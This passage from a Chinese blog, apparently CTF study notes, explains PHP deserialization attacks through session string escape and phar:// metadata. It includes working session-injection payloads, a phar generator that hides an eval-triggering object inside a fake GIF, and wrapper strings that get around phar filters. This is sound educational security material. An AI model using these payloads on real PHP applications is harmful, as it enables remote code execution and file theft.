<li>前面 <code>a:3:</code> 表示 SESSION 含有三个键值对，它会一直向后取直到取到三个为止；第一个 user 正常取值；第二个 function 由于长度是 42 ，将会取到的值是 <code>p&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> ；所以仍旧会取到第三个 img 值为 <code>Z3Vlc3RfaW1nLnBuZw==</code> ；但是进行反序列化之后，我们希望得到的是第三个 img 被挤掉，以我们在 function 中传递的 img 作为新的 img ；所以实际上如果 <code>s:42:&quot;p&quot;</code> 是 <code>s:1:&quot;p&quot;</code> 就好了。 </li>
<li>利用过滤函数使字符减少来增大长度，吞掉后面部分内容。</li>
</ol>
</blockquote>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 string(127) &quot;a:3:&#123;s:4:&quot;user&quot;;s:4:&quot;&quot;;s:8:&quot;function&quot;;s:42:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="7">
<li><code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code> 长度是 24，构造 user 值是 6个 flag ，即长度是 24，将会把 <code>&quot;;s:8:&quot;function&quot;;s:42:&quot;b</code>吞掉，当作 user 的值；而 img 即为我们的 <code>d0g3_f1ag.php</code>；再手动补充一个键值对（随意）满足 _SESSION 的三个键；而位于最后的默认的 <code>guest_img.png</code> 将被挤掉，不会起作用；</li>
</ol>
<p> <strong>注意：</strong>由于吞掉了一个键值对，我们把 img 作为第二个键名存在了，但 SESSION 本身是有三个键值对的，如果我们不手动添加一个键值对的话，最后存在的原本的 img 也将会被解析，起不到挤掉的作用。</p>
</blockquote>
<p><strong>payload1 —  键值逃逸：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(146) &quot;a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:60:&quot;b&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;c&quot;;s:3:&quot;111&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; </span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/13/dbMkafNKIsSPulh.png" alt="0"></p>
<blockquote>
<ol start="8">
<li>对 <code>/d0g3_fllllllag</code> 进行 base64编码为 <code>L2QwZzNfZmxsbGxsbGFn</code>，长度是 20；</li>
</ol>
<p> 构造以下内容：</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">b</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/13/LroXScDCuzgTatf.png" alt="image-20210613172316408"></p>
<blockquote>
<ol start="9">
<li><code>&quot;;s:49:</code> 长度是 7，构造 键名为 flagphp，将其吞掉作为一个新的键名，值是 db；第二个键名 img 即是我们所构造的；由于 <code>a:2:</code>，因此一共只会取两个键名，所以最后的 img 被挤掉了。</li>
</ol>
</blockquote>
<p><strong>payload2 —  键名逃逸：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化后 string(108) &quot;a:2:&#123;s:7:&quot;&quot;;s:49:&quot;;s:2:&quot;db&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>函数总结：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">implode()	把数组元素组合为一个字符串后返回：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> implode(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 Hello World! Beautiful Day!</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">unset</span>()		销毁指定的变量    </span><br><span class="line">    </span><br><span class="line">extract() 	函数从数组中将变量导入到当前的符号表</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># 返回 $a = Cat; $b = Dog; $c = Horse </span></span><br><span class="line">该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</span><br><span class="line"></span><br><span class="line">第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</span><br><span class="line"></span><br><span class="line">该函数返回成功导入到符号表中的变量数目。</span><br></pre></td></tr></table></figure>

<h1 id="三、phar-序列化"><a href="#三、phar-序列化" class="headerlink" title="三、phar 序列化"></a>三、phar 序列化</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq975353472/article/details/109668373">https://blog.csdn.net/qq975353472/article/details/109668373</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
<p>一般利用反序列化漏洞，一般都是借助unserialize()函数。</p>
<p><strong>新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</strong></p>
<ul>
<li>特点：不使用 <code>unserialize()函数</code></li>
</ul>
<p><strong>利用条件：</strong></p>
<ul>
<li>能够上传 <code>.phar</code> 文件至服务器</li>
<li>存在可用的 魔术方法 作为跳板</li>
<li>文件操作函数的参数可控</li>
<li><code>/  :   phar</code>  等特殊字符未被过滤</li>
</ul>
<p><strong>受影响函数列表：</strong></p>
<p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p>
<p>原理参考 <a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<h2 id="3-1-phar-介绍"><a href="#3-1-phar-介绍" class="headerlink" title="3.1 phar 介绍"></a>3.1 phar 介绍</h2><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 <code>meta-data</code> ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。</p>
<p>在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。</p>
<ul>
<li>版本 &gt;5.2</li>
</ul>
<p><strong>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。</strong>内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 <strong>phar://就是一种内置的流包装器。</strong></p>
<p><strong>php中一些常见的流包装器如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h2 id="3-2-phar-文件结构"><a href="#3-2-phar-文件结构" class="headerlink" title="3.2 phar 文件结构"></a>3.2 phar 文件结构</h2><ul>
<li><p>a stub</p>
<p>phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>a manifest describing the contents</p>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。</p>
<p><img src="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png" alt="image-20210816144952619"></p>
</li>
<li><p>the file contents</p>
<p>所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写</p>
</li>
<li><p>a signature for verifying Phar integrity</p>
<p>签名格式，位于末尾</p>
<p><img src="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png" alt="image-20210816145202078"></p>
</li>
</ul>
<h2 id="3-3-测试：phar-文件的构造"><a href="#3-3-测试：phar-文件的构造" class="headerlink" title="3.3 测试：phar 文件的构造"></a>3.3 测试：phar 文件的构造</h2><ul>
<li><p>条件：php.ini</p>
<p><img src="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png" alt="image-20210816145304311"></p>
</li>
</ul>
<p><strong>编写 生成 .phar 文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;		</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">	<span class="variable">$o</span>-&gt;data = <span class="string">&#x27;hacker123!&#x27;</span>;</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	<span class="comment">//签名将自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问过后，会在当前目录下生成 <code>1.phar</code> 文件，打开，看其内容</p>
<p><img src="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png" alt="image-20210816150109626"></p>
<p><strong>发现，meta-data 是以序列化的形式存储的</strong></p>
<p><strong>那么，在哪里进行反序列化？</strong></p>
<p><strong>phar://协议读取文件</strong></p>
<ul>
<li><p>php 大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有</p>
<p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://1.phar&#x27;</span>);<span class="comment">//phar:// 触发：进行反序列化</span></span><br></pre></td></tr></table></figure>

<p>访问，成功触发了反序列化，得到 </p>
<p><img src="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png" alt="image-20210816150553492"></p>
<h2 id="3-4-常见利用：文件上传-文件包含"><a href="#3-4-常见利用：文件上传-文件包含" class="headerlink" title="3.4 常见利用：文件上传+文件包含"></a>3.4 常见利用：文件上传+文件包含</h2><p><strong>环境：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php <span class="comment"># 后端检测文件上传,确保文件类型及后缀是 .gif</span></span><br><span class="line">upload_file.html <span class="comment">#文件上传表单前端</span></span><br><span class="line">file_un.php  <span class="comment">#存在 file_exists() 以及  __destruct() 用以phar://伪协议读取文件内容</span></span><br></pre></td></tr></table></figure>

<p><strong>利用条件：</strong></p>
<ul>
<li>存在文件上传</li>
<li>存在 <code>file_exists()  fopen()  file_get_contents()  file()</code> 等文件操作函数</li>
<li><code>phar://</code> 等字符未被过滤</li>
</ul>
<p><strong>upload_file.php</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>upload_file.html</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/ctf/phar/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><strong>file_un.php</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlihgt_file(__FILE__);</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<p><strong>题目：</strong></p>
<p><img src="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png" alt="image-20210816151653686"></p>
<p><strong>生成 .phar 文件：</strong>phar.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlihgt_file(__FILE__);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hack.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> AnyClass();</span><br><span class="line">	<span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest	</span></span><br><span class="line">	<span class="comment">//签名2将自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>访问，得到 hack.phar</p>
<p><img src="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png" alt="image-20210816152258664"></p>
<p>将 hack.phar 后缀修改为 hack.gif</p>
<p>在 upload_file.html 里上传</p>
<p><img src="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png" alt="image-20210816152845318"></p>
<p><img src="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png" alt="image-20210816152858027"></p>
<p>然后我们进入 file_un.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://hack.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png" alt="image-20210816153008894"></p>
<p>可以看到，命令成功执行</p>
<h2 id="3-5-绕过姿势：过滤-phar"><a href="#3-5-绕过姿势：过滤-phar" class="headerlink" title="3.5 绕过姿势：过滤 phar"></a>3.5 绕过姿势：过滤 phar</h2><ul>
<li>当题目环境限制 phar 不能出现在前面的字符里，即无法使用 <code>phar:// 协议</code>  ，可以使用 <code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li>
<li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;setStub(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-6-php-session-反序列化"><a href="#3-6-php-session-反序列化" class="headerlink" title="3.6 php-session 反序列化"></a>3.6 php-session 反序列化</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p>
<h3 id="3-6-1-关于-php-中的-session-存储机制"><a href="#3-6-1-关于-php-中的-session-存储机制" class="headerlink" title="3.6.1 关于 php 中的 session 存储机制"></a>3.6.1 关于 php 中的 session 存储机制</h3><p><strong>session 介绍：</strong></p>
<blockquote>
<p>在计算机中，尤其是在网络应用中，称为“<strong>会话控制</strong>”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
